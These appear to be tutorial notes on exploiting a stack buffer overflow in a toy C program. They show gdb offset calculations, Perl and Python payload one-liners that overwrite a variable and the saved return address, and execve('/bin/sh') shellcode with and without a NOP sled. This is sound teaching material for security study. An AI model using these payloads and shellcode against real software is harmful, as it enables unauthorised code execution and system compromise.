# Exploitation


## Buffer Overflow

### What it is
A **buffer overflow** happens when a program copies more data into a buffer than it can store.
If the buffer is on the stack, the extra bytes can overwrite important data like the **saved return address**.


### Example 1: x86 overflow

With this example:  
  
```
void callit (char *name) {
	int value;
	char buffer[500];
	
	value = 0;	
	strcpy (buffer, name);
	printf ("-------------------\n");
	printf ("Value : \t%p [%d]\n", &value, value);	
	printf ("Buffer in: \t%p\n", buffer);
	printf ("Address of function success2: %p\n", success2); 	
	printf ("-------------------\n");
	if (value==3) {
		 success();
	}
	else {
		printf ("[!] No success\n"); 
	}
	value = 0; 
}

``` 
Goal: get value == 3.

1) Change the value of the variable "value" to 3:
```
./vuln `perl -e 'print "A"x500 . "\x03"'` 
```

2) Execute the function success2. Find the value of the pointer to the function success2 using gdb:

    `(gdb) print success2
	       $1 = {int ()} 0x8049339 <success2>0x8049339`

3) Find the position of the Saved EIP with gdb --> offset of 516 bytes. Compute the offset:

  ``` 
    gdb -q vuln 
    break main
    print $rbp
    x/x buf
    print buf
    offset = print /d <rbp> - <buf> + 8(64)/4(32)
  ```

4) Overflow the Saved EIP.
``` 
    ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x39\x93\x04\x08"'`

    ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x39\x93\x04\x08")')
```

5) Execute a shellcode that launches /bin/sh:

    Shellcode (25 bytes): execve("/bin/sh", ["/bin/sh"], 0)
    In hex: `"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"`
       
- Without NOP Sled: 
```
./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`  
``` 
"A"x475 -> buffer size = 500 // shellcode size = 25 // 500-25=475 fill until the buffer is full

x03 -> value==3

"B"x15 -> fill the buffer = 500 // write x03 = 1 // 500+1=501 // offset = 516 // 516-501=15

\x78\xca\xff\xff -> dir we want to add in the return address

``` 
./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A"*475 + b"\x03" + b"B"*15 + b"\x78\xca\xff\xff")')
```


- With NOP Sled

	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`'










